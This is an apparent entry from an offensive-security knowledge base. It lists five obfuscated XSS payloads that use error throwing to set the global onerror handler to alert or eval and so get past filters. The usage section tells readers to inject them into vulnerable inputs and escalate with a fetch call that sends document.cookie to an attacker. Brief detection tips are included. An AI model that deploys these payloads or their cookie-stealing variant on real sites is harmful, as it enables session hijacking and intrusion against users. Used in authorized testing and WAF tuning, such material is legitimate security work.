---
id: f34cd942-1e12-410c-864f-375c560f8d0b
type: code
language: JavaScript
verified: true
created_at: '2023-04-06T03:56:42.556328+00:00'
updated_at: '2023-04-10T20:21:31.907097+00:00'
tags:
  - xss
  - filter-bypass
  - exotic-payload
platforms:
  - Web
validated: true
---

# XSS-Exotic-Script-Injection-Payloads

## Code

```javascript
// From @garethheyes
<script>onerror=alert;throw 1337</script>
<script>{onerror=alert}throw 1337</script>
<script>throw onerror=alert,'some string',123,'haha'</script>

// From @terjanq
<script>throw/a/,Uncaught=1,g=alert,a=URL+0,onerror=eval,/1/g+a[12]+[1337]+a[13]</script>

// From @cgvwzq
<script>TypeError.prototype.name ='=/',0[onerror=eval]['/-alert(1)//']</script>
```

## Description

This code collection provides exotic JavaScript payloads for XSS filter bypass. Each snippet uses error throwing to invoke the global onerror handler, setting it to execute alert or eval without relying on blocked syntax like direct script tags, semicolons, or parentheses. These are designed for injection into HTML contexts where standard XSS fails due to sanitization.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| alert | Function to execute on error (replace for custom actions like data exfil) | alert(document.domain) |
| throw value | Error value to trigger onerror (numeric or string for obfuscation) | 1337 or 'some string' |

No dynamic variables; payloads are static but customizable by editing the onerror assignment.

## Usage

Inject these payloads into vulnerable inputs (e.g., ?q=<payload> in a search endpoint). They trigger on page load when the browser parses the invalid script, throwing an error that executes the set handler. Ideal for reflected XSS testing; escalate by replacing alert with fetch('/exfil?data='+document.cookie) to send data to an attacker server. Use in Burp Repeater or manual testing to verify bypass.

## Detection

- Browser console logs unhandled errors or eval calls.
- WAF logs for anomalous script patterns or onerror assignments.
- CSP violations if policy blocks inline scripts.
- Network monitoring for unexpected data exfiltration requests.

## Related

- [[procedures/Exotic-Payloads-for-Bypassing-XSS-Filters]]
